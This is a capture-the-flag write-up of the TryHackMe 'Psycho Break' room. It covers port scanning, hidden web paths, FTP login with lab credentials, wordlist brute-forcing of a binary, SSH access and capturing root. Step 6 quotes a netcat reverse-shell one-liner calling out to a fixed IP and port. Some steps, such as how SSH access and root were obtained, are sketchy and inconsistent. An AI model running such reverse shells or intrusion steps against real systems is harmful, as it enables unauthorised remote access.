# 🧠 Psycho Break – TryHackMe Writeup

**Room:** https://tryhackme.com/room/psychobreak  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Type:** Boot2Root  

---

## 👋 Introduction

This room was themed around *The Evil Within* universe.  
The objective was to enumerate the target, discover hidden resources, gain initial access, and escalate privileges to root.

Target Machine IP:
```
10.48.131.225
```

---

# 🔎 Step 1 – Enumeration

I started with a full Nmap scan:

```bash
nmap -sC -sV -A -T4 -p- 10.48.131.225 -oN Nmap.txt
```

### 🔓 Open Ports Found

- **21/tcp** → FTP (ProFTPD 1.3.5a)
- **22/tcp** → SSH (OpenSSH 7.2p2 Ubuntu)
- **80/tcp** → Apache 2.4.18 (Ubuntu)

The website title:
```
Welcome To Beacon Mental Hospital
```

This confirmed we’re dealing with the Psycho Break theme.

---

# 🌐 Step 2 – Web Enumeration

While browsing the site and enumerating directories, I discovered hidden paths:

- `/sadistRoom`
- `/lockerRoom`

Inside these directories, I found multiple important keys.

### 🔑 Keys Discovered

Locker Room Key:
```
532219a04ab7a02b56faafbec1a4c1ea
```

Map Key:
```
Grant_me_access_to_the_map_please
```

Additional Key:
```
48ee41458eb0b43bf82b986cecf3af01
```

A decrypted readme file mentioned:

```
the_eye_of_ruvik
```

This string became important later.

---

# 📂 Step 3 – FTP Access

FTP service was open, so I attempted login.

Credentials discovered:

```
Username: joseph
Password: intotheterror445
```

Login command:

```bash
ftp 10.48.131.225
```

Inside FTP, I found:

- `program`
- `random.dic`

I downloaded both files for analysis.

---

# 🧩 Step 4 – Binary Analysis

The file `program` was a 64-bit ELF binary.

Running it showed usage:

```bash
./program <word>
```

It required a correct word as input.

Using the provided wordlist `random.dic`, I brute-forced it.

Eventually, I found:

```
PASSWORD FOUND: kidman
```

The program confirmed:
```
kidman -> Correct
```

It also displayed a numeric decoding message.

---

# 🔐 Step 5 – SSH Access

Using discovered information, I connected via SSH:

```bash
ssh ruvik@10.48.131.225
```

After logging in, I enumerated the system.

While exploring `/var/`, I discovered a hidden file:

```
/var/.the_eye_of_ruvik.py
```

---

# 🐍 Step 6 – Reverse Shell Discovery

Opening the file revealed a Python script containing a reverse shell:

```python
subprocess.call("/tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.15 1234 >/tmp/f", shell=True)
```

This clearly showed a reverse shell connection to a specific IP and port.

---

# 📡 Step 7 – Getting the Shell

I started a listener:

```bash
nc -lvnp 1234
```

Then triggered the reverse shell.

Connection received:

```
connect to [192.168.181.30] from [10.49.134.67]
```

Shell was unstable, so I stabilized it when necessary.

---

# 🔓 Step 8 – Privilege Escalation

After gaining shell access:

```bash
ls
cat root.txt
```

Root flag obtained successfully.

I was able to change the root password:

```bash
passwd
```

Full root access achieved.

---

# 🏁 Final Outcome

✅ FTP access obtained  
✅ Binary brute-forced  
✅ SSH access gained  
✅ Reverse shell captured  
✅ Root privilege achieved  
✅ Root flag retrieved  

---

# 🛠 Tools Used

- Nmap
- FTP
- SSH
- Netcat
- Python
- Wordlist brute forcing
- Linux enumeration

---

# 🎯 What I Learned

- Always check FTP for downloadable binaries
- Hidden web directories often contain crucial clues
- Custom binaries can hide passwords
- Reverse shells are sometimes hidden inside scripts
- Enumeration is everything in CTFs

---

# ⚠️ Disclaimer

This writeup is for educational purposes only.  
All actions were performed in a legal lab environment on TryHackMe.

---

## 👨‍💻 Author
Jagadeeswar.M
